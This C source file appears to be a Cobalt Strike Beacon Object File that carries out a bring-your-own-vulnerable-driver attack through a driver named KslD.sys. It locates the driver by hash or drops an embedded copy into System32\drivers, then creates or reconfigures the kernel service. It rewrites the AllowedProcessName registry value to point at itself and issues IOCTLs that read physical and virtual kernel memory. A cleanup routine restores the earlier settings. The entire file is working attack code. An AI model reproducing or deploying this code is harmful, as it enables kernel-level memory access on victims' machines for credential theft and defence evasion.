#include "driver.h"
#include "driver_payload.h"



// ================================================================
// Raw IOCTL
// ================================================================
Bytes ioctl_raw(HANDLE h, const void* in_buf, DWORD in_size, DWORD out_size) {
    Bytes out = Bytes_zeros(out_size);
    DWORD bytes_ret = 0;
    BOOL ok = DeviceIoControl(h, KSLD_IOCTL,
        (void*)in_buf, in_size,
        out.data, out_size, &bytes_ret, NULL);
    if (ok && bytes_ret > 0) {
        out.size = bytes_ret;
        return out;
    }
    Bytes_free(&out);
    return out;
}

Bytes subcmd2(HANDLE h) {
    IoSubCmd2 cmd; cmd.sub_cmd = 2; cmd.reserved = 0;
    return ioctl_raw(h, &cmd, sizeof(cmd), 512);
}

Bytes phys_read(HANDLE h, uint64_t addr, uint64_t size) {
    IoReadInput req;
    req.sub_cmd = 12; req.reserved = 0;
    req.address = addr; req.size = size;
    req.mode = 1; req.padding = 0;
    DWORD out_sz = (DWORD)(size + 256 > 4096 ? size + 256 : 4096);
    Bytes out = ioctl_raw(h, &req, sizeof(req), out_sz);
    if (out.size >= size) return out;
    Bytes_free(&out);
    return out;
}

Bytes virt_read_single(HANDLE h, uint64_t addr, uint64_t size) {
    IoReadInput req;
    req.sub_cmd = 12; req.reserved = 0;
    req.address = addr; req.size = size;
    req.mode = 2; req.padding = 0;
    DWORD out_sz = (DWORD)(size + 256 > 4096 ? size + 256 : 4096);
    Bytes out = ioctl_raw(h, &req, sizeof(req), out_sz);
    if (out.size >= size) return out;
    Bytes_free(&out);
    return out;
}

Bytes virt_read(HANDLE h, uint64_t addr, uint64_t size) {
    Bytes data = virt_read_single(h, addr, size);
    if (!Bytes_empty(&data)) return data;
    // Try chunked read
    Bytes result = Bytes_alloc((size_t)size);
    uint64_t off = 0;
    while (off < size) {
        uint64_t chunk = 0x400;
        if (chunk > size - off) chunk = size - off;
        Bytes part = virt_read_single(h, addr + off, chunk);
        if (Bytes_empty(&part)) {
            Bytes_free(&result);
            Bytes_free(&part);
            return result;
        }
        MSVCRT$memcpy(result.data + result.size, part.data, (size_t)chunk);
        result.size += (size_t)chunk;
        Bytes_free(&part);
        off += chunk;
    }
    return result;
}

// ================================================================
// Path helpers
// ================================================================
void get_drivers_dir(wchar_t* out, size_t out_len) {
    wchar_t sys[MAX_PATH] = {0};
    GetSystemWindowsDirectoryW(sys, MAX_PATH);
    MSVCRT$memcpy(out, sys, MSVCRT$wcslen(sys) * sizeof(wchar_t));
    out[MSVCRT$wcslen(sys)] = L'\0';
    // Append System32/drivers suffix
    const wchar_t* suffix = L"\\System32\\drivers\\";
    size_t slen = MSVCRT$wcslen(sys);
    size_t sfxlen = 18; // len of suffix
    MSVCRT$memcpy(out + slen, suffix, (sfxlen + 1) * sizeof(wchar_t));
}

void get_nt_volume_path(const wchar_t* win32_path, wchar_t* out, size_t out_len) {
    wchar_t vol_name[MAX_PATH] = {0};
    wchar_t drive[3] = { win32_path[0], win32_path[1], 0 };
    if (QueryDosDeviceW(drive, vol_name, MAX_PATH)) {
        size_t vl = MSVCRT$wcslen(vol_name);
        MSVCRT$memcpy(out, vol_name, vl * sizeof(wchar_t));
        const wchar_t* rest = win32_path + 2;
        size_t rl = MSVCRT$wcslen(rest);
        MSVCRT$memcpy(out + vl, rest, (rl + 1) * sizeof(wchar_t));
    } else {
        const wchar_t* fallback = L"\\Device\\HarddiskVolume3";
        size_t fl = MSVCRT$wcslen(fallback);
        MSVCRT$memcpy(out, fallback, fl * sizeof(wchar_t));
        const wchar_t* rest = win32_path + 2;
        size_t rl = MSVCRT$wcslen(rest);
        MSVCRT$memcpy(out + fl, rest, (rl + 1) * sizeof(wchar_t));
    }
}

// ================================================================
// SHA256 of a file (BCrypt)
// ================================================================
void sha256_file(const wchar_t* path, char* out_hex64) {
    out_hex64[0] = '\0';
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;

    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        { CloseHandle(hf); return; }
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0)))
        { BCryptCloseAlgorithmProvider(alg, 0); CloseHandle(hf); return; }

    uint8_t* buf = (uint8_t*)MSVCRT$malloc(4096);
    if (!buf) { BCryptDestroyHash(hash); BCryptCloseAlgorithmProvider(alg, 0); CloseHandle(hf); return; }
    DWORD read_bytes = 0;
    BOOL ok;
    while ((ok = ReadFile(hf, buf, 4096, &read_bytes, NULL)) && read_bytes > 0)
        BCryptHashData(hash, buf, read_bytes, 0);
    MSVCRT$free(buf);

    uint8_t digest[32] = {0};
    BCryptFinishHash(hash, digest, 32, 0);
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    CloseHandle(hf);

    to_hex(out_hex64, 65, digest, 32);
}

// ================================================================
// Driver check: find existing or deploy embedded
// ================================================================
BOOL file_exists_with_size(const wchar_t* path, size_t expected_size) {
    WIN32_FILE_ATTRIBUTE_DATA fa = {0};
    if (!GetFileAttributesExW(path, GetFileExInfoStandard, &fa)) return FALSE;
    // Only check if expected_size > 2 (stub payload is 2 bytes in placeholder)
    if (expected_size <= 2) return TRUE; // placeholder check
    ULARGE_INTEGER sz;
    sz.LowPart = fa.nFileSizeLow;
    sz.HighPart = fa.nFileSizeHigh;
    return (sz.QuadPart == expected_size);
}

BOOL find_vulnerable_driver(wchar_t* out_path) {
    const char expected_hash[] = "bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a";
    wchar_t dir[MAX_PATH] = {0};
    get_drivers_dir(dir, MAX_PATH);

    // Priority 1: KslD.sys
    wchar_t ksld_path[MAX_PATH] = {0};
    size_t dl = MSVCRT$wcslen(dir);
    MSVCRT$memcpy(ksld_path, dir, dl * sizeof(wchar_t));
    const wchar_t* fn1 = L"KslD.sys";
    MSVCRT$memcpy(ksld_path + dl, fn1, (MSVCRT$wcslen(fn1) + 1) * sizeof(wchar_t));

    if (file_exists_with_size(ksld_path, VKSLD_SIZE)) {
        char hash[65] = {0};
        sha256_file(ksld_path, hash);
        if (MSVCRT$memcmp(hash, expected_hash, 64) == 0) {
            MSVCRT$memcpy(out_path, ksld_path, (MSVCRT$wcslen(ksld_path) + 1) * sizeof(wchar_t));
            return TRUE;
        }
    }

    // Priority 2: oKslD.sys
    wchar_t vksld_path[MAX_PATH] = {0};
    MSVCRT$memcpy(vksld_path, dir, dl * sizeof(wchar_t));
    const wchar_t* fn2 = L"oKslD.sys";
    MSVCRT$memcpy(vksld_path + dl, fn2, (MSVCRT$wcslen(fn2) + 1) * sizeof(wchar_t));

    if (file_exists_with_size(vksld_path, VKSLD_SIZE)) {
        char hash[65] = {0};
        sha256_file(vksld_path, hash);
        if (MSVCRT$memcmp(hash, expected_hash, 64) == 0) {
            MSVCRT$memcpy(out_path, vksld_path, (MSVCRT$wcslen(vksld_path) + 1) * sizeof(wchar_t));
            return TRUE;
        }
    }

    out_path[0] = L'\0';
    return FALSE;
}

BOOL deploy_embedded_driver(wchar_t* out_path) {
    const char expected_hash[] = "bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a";
    wchar_t dir[MAX_PATH] = {0};
    get_drivers_dir(dir, MAX_PATH);
    size_t dl = MSVCRT$wcslen(dir);
    MSVCRT$memcpy(out_path, dir, dl * sizeof(wchar_t));
    const wchar_t* fn = L"oKslD.sys";
    MSVCRT$memcpy(out_path + dl, fn, (MSVCRT$wcslen(fn) + 1) * sizeof(wchar_t));

    internal_printf("  [*] Deploying embedded driver to oKslD.sys...\n");

    HANDLE hf = CreateFileW(out_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile for driver failed: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL ok = WriteFile(hf, VKSLD_DATA, (DWORD)VKSLD_SIZE, &written, NULL);
    CloseHandle(hf);

    if (!ok || written != (DWORD)VKSLD_SIZE) {
        DeleteFileW(out_path);
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteFile for driver failed\n");
        return FALSE;
    }

    char hash[65] = {0};
    sha256_file(out_path, hash);
    if (MSVCRT$memcmp(hash, expected_hash, 64) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Deployed driver hash mismatch\n");
        DeleteFileW(out_path);
        return FALSE;
    }

    internal_printf("  [+] Driver deployed and verified\n");
    return TRUE;
}

// ================================================================
// Derive relative ImagePath: strip drive + directory up to system32
// ================================================================
void to_relative_image_path(const wchar_t* full_path, wchar_t* out, size_t out_len) {
    // Find "system32" case-insensitively
    const wchar_t* needle = L"system32";
    size_t flen = MSVCRT$wcslen(full_path);
    size_t nlen = 8;
    for (size_t i = 0; i + nlen <= flen; i++) {
        // simple case-insensitive compare
        BOOL match = TRUE;
        for (size_t j = 0; j < nlen; j++) {
            wchar_t fc = full_path[i+j];
            if (fc >= 'A' && fc <= 'Z') fc += 32;
            if (fc != needle[j]) { match = FALSE; break; }
        }
        if (match) {
            const wchar_t* sub = full_path + i;
            size_t sublen = MSVCRT$wcslen(sub);
            MSVCRT$memcpy(out, sub, (sublen + 1) * sizeof(wchar_t));
            return;
        }
    }
    // Fallback: use full path
    MSVCRT$memcpy(out, full_path, (flen + 1) * sizeof(wchar_t));
}

// ================================================================
// setup_ksld: deploy/find driver, configure SCM and AllowedProcessName
// ================================================================
BOOL setup_ksld(DriverState* state) {
    MSVCRT$memset(state, 0, sizeof(*state));
    state->handle = INVALID_HANDLE_VALUE;

    // Step 1: Find or deploy driver
    wchar_t driver_path[MAX_PATH] = {0};
    if (!find_vulnerable_driver(driver_path)) {
        internal_printf("  [*] No existing driver, deploying embedded...\n");
        if (!deploy_embedded_driver(driver_path)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Vulnerable driver not available\n");
            return FALSE;
        }
        state->driver_was_deployed = TRUE;
    } else {
        internal_printf("  [+] Found existing driver\n");
    }

    wchar_t image_path[MAX_PATH] = {0};
    to_relative_image_path(driver_path, image_path, MAX_PATH);

    // Step 2: Open SCM
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }

    // Step 3: Open or create service
    SC_HANDLE svc = OpenServiceW(scm, L"KslD", SERVICE_ALL_ACCESS);
    if (!svc) {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
            svc = CreateServiceW(scm, L"KslD", L"KslD",
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL, image_path,
                NULL, NULL, NULL, NULL, NULL);
            if (!svc) {
                BeaconPrintf(CALLBACK_ERROR, "[-] CreateService failed: %lu\n", GetLastError());
                CloseServiceHandle(scm);
                return FALSE;
            }
            state->service_was_created = TRUE;
            internal_printf("  [+] Created KslD service\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] OpenService failed: %lu\n", GetLastError());
            CloseServiceHandle(scm);
            return FALSE;
        }
    } else {
        // Save original config
        DWORD needed = 0;
        QueryServiceConfigW(svc, NULL, 0, &needed);
        if (needed > 0) {
            uint8_t* buf = (uint8_t*)MSVCRT$malloc(needed);
            QUERY_SERVICE_CONFIGW* cfg = (QUERY_SERVICE_CONFIGW*)buf;
            if (QueryServiceConfigW(svc, cfg, needed, &needed) && cfg->lpBinaryPathName) {
                size_t plen = MSVCRT$wcslen(cfg->lpBinaryPathName);
                if (plen < MAX_PATH)
                    MSVCRT$memcpy(state->orig_image_path, cfg->lpBinaryPathName, (plen+1)*sizeof(wchar_t));
            }
            MSVCRT$free(buf);
        }
        // Stop if running
        SERVICE_STATUS ss = {0};
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        Sleep(2000);
        // Change ImagePath
        ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
            image_path, NULL, NULL, NULL, NULL, NULL, NULL);
    }

    // Step 4: AllowedProcessName registry key
    HKEY hk = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\KslD",
                       0, KEY_ALL_ACCESS, &hk) == ERROR_SUCCESS) {
        // Save original
        DWORD orig_sz = sizeof(state->orig_allowed);
        RegQueryValueExW(hk, L"AllowedProcessName", NULL, NULL,
            (LPBYTE)state->orig_allowed, &orig_sz);

        // Set to our process path
        wchar_t exe_path[MAX_PATH] = {0};
        GetModuleFileNameW(NULL, exe_path, MAX_PATH);
        wchar_t allowed[MAX_PATH] = {0};
        get_nt_volume_path(exe_path, allowed, MAX_PATH);
        RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
            (const BYTE*)allowed,
            (DWORD)((MSVCRT$wcslen(allowed) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }

    // Step 5: Start service
    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            BeaconPrintf(CALLBACK_ERROR, "[-] StartService failed: %lu\n", err);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return FALSE;
        }
    }
    Sleep(2000);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    // Step 6: Open device
    HANDLE h = CreateFileW(L"\\\\.\\KslD", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile(\\\\.\\KslD) failed: %lu\n", GetLastError());
        return FALSE;
    }

    state->handle = h;
    return TRUE;
}

// ================================================================
// cleanup_ksld
// ================================================================
void cleanup_ksld(DriverState* state) {
    if (state->handle != INVALID_HANDLE_VALUE) {
        CloseHandle(state->handle);
        state->handle = INVALID_HANDLE_VALUE;
    }

    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, L"KslD", SERVICE_ALL_ACCESS);
    if (!svc) { CloseServiceHandle(scm); return; }

    SERVICE_STATUS ss = {0};
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    Sleep(1000);

    if (state->service_was_created) {
        DeleteService(svc);
        internal_printf("  [+] Deleted KslD service\n");
    } else {
        if (state->orig_image_path[0] != L'\0')
            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                state->orig_image_path, NULL, NULL, NULL, NULL, NULL, NULL);
        if (state->orig_allowed[0] != L'\0') {
            HKEY hk = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\KslD",
                               0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
                    (const BYTE*)state->orig_allowed,
                    (DWORD)((MSVCRT$wcslen(state->orig_allowed) + 1) * sizeof(wchar_t)));
                RegCloseKey(hk);
            }
        }
        StartServiceW(svc, 0, NULL);
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (state->driver_was_deployed) {
        Sleep(500);
        wchar_t dir[MAX_PATH] = {0};
        get_drivers_dir(dir, MAX_PATH);
        size_t dl = MSVCRT$wcslen(dir);
        wchar_t path[MAX_PATH] = {0};
        MSVCRT$memcpy(path, dir, dl * sizeof(wchar_t));
        const wchar_t* fn = L"vKslD.sys";
        MSVCRT$memcpy(path + dl, fn, (MSVCRT$wcslen(fn) + 1) * sizeof(wchar_t));
        if (DeleteFileW(path))
            internal_printf("  [+] Removed deployed vKslD.sys\n");
    }
}
